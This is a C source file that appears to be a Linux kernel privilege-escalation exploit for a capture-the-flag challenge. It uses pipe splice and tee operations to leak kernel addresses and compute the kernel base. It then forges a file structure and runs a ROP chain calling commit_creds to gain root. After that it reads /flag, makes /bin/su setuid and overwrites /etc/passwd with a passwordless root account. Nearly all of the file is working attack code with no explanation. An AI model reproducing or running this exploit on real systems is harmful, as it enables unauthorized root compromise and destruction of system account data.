#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/stat.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;


#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)

#define asm __asm__

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) logErr("%s:%d: returned 0x%lx", __FILE__, __LINE__, (u64)_r); \
    _r; \
});

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

uint64_t saved_stack;
int fds[0x100];

void getShell()
{
    asm("mov rsp, [rip+saved_stack]\n");
    asm("mov rbp, rsp\n add rbp, 0x100");

    if (getuid())
    {
        panic("NO ROOT");
    }

    logOK("Root!");

    int fd = open("/flag", 0);
    char* buf = malloc(0x100);
    read(fd, buf, 0x100);
    puts(buf);

    chmod("/bin/su", 04755);
    unlink("/etc/passwd");
    fd = open("/etc/passwd", O_RDWR | O_CREAT, 0777);
    write(fd, "root::0:0:Linux User,,,:/:/bin/sh\n\0", 36);
    close(fd);

    while(1)
        sleep(9999);
}


void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

u64 kbase = 0;

void pwn(int stat_fd)
{
  __asm__("mov r15, [rip+kbase]\n"
          "add r15, 0xf3269f\n" // pop rdi ; ret
          "mov r14, [rip+kbase] \n"
          "add r14, 0x1a51d60\n" // init_creds
          "mov r13, [rip+kbase]\n"
          "add r13, 0xc0050\n"                       // commit_creds
          "mov r12, [rip+kbase]\n add r12, 0x7b02f3\n" // pop rcx ; ret
          "lea rbp, [rip+getShell+0x8]\n"            //
          "mov rbx, [rip+kbase]\n add rbx, 0x139ce0\n"  //  pop r11 ; pop rbp ; ret ;
          "mov r9, [rip+kbase]\n add r9, 0x1000168\n"
          "mov rdx, 0x4343\n"
          "mov rsi, 0x4242\n"
          "xor eax, eax\n"
          "syscall\n"
  );
}


int main(int argc, char **argv, char **envp) {

    pin_cpu(0);

    int pipe1[2];
    int pipe2[2];
    int pipe3[2];

    int pid = fork();

    if (pid != 0) {
        sleep(3);
        system("su root");
        exit(0);
    }

    saved_stack = (ulong)&pipe3;

    char *tmpbuf = malloc(0x1000);
    memset(tmpbuf, 'A', 0x1000);

    pipe(pipe1);
    pipe(pipe2);
    pipe(pipe3);

    fcntl(pipe1[1], F_SETPIPE_SZ, 4 * 0x1000);
    fcntl(pipe2[1], F_SETPIPE_SZ, 2 * 0x1000);
    fcntl(pipe3[1], F_SETPIPE_SZ, 2 * 0x1000);

    memset(tmpbuf, '@', 0x1000);
    for(u32 i = 0 ; i < 3 ; ++i)
        write(pipe1[1], tmpbuf, 0x1000);

    memset(tmpbuf, 'A', 0x1000);

    splice(pipe1[0], NULL, pipe2[1], NULL, 0x1000, 0);

    logInfo("tee");

    read(pipe2[0], tmpbuf, 0x1000);

    SAFE(syscall(__NR_tee, pipe1[0], pipe2[1], 0x1000, 0));
    SAFE(syscall(__NR_tee, pipe2[0], pipe1[1], 0x1000, 0));

    for(u32 i = 0 ; i < 2 ; ++i)
        read(pipe1[0], tmpbuf, 0x1000);

    close(pipe1[1]);
    close(pipe1[0]);

    memset(tmpbuf, '3', 0x1000);
    write(pipe3[1], tmpbuf, 0xb0);

    close(pipe2[1]);
    close(pipe2[0]);

    for (u32 i = 0; i < 0x100; ++i) {
        fds[i] = open("/proc/self/stat", 0);
    }

    //WAIT();

    read(pipe3[0], tmpbuf, 0x68);
    u64 proc_single_file_operations = *(u64 *)(tmpbuf + 0x10);
    u64 page_vaddr = *(u64 *)(tmpbuf + 0x60) - 0x60;

    logOK("proc_single_file_operations @ 0x%lx", proc_single_file_operations);
    logOK("page_vaddr @ 0x%lx", page_vaddr);
    kbase = proc_single_file_operations-0x1229760;

    u64 _[] = {
        [3] = kbase + 0x3b421b, // read op: add rsp, 0x00000000000000E0 ; mov eax, ecx ; pop rbx ; pop r14 ; ret ; -> rsp+0xf0
        [0xa] = 100,        // f_count + f_lock
        [0xb] = 0xa800d00000000,  // f_mode
        [0xc] = page_vaddr + 0xb0, // f_op
        [0xf] = kbase + 0x5238f6 // release op: ret
    };

    write(pipe3[1], _, sizeof(_));

    for (u32 i = 1; i < 0x100; ++i) {
        pwn(fds[i]);
    }

    while(1)
        sleep(9999);
}
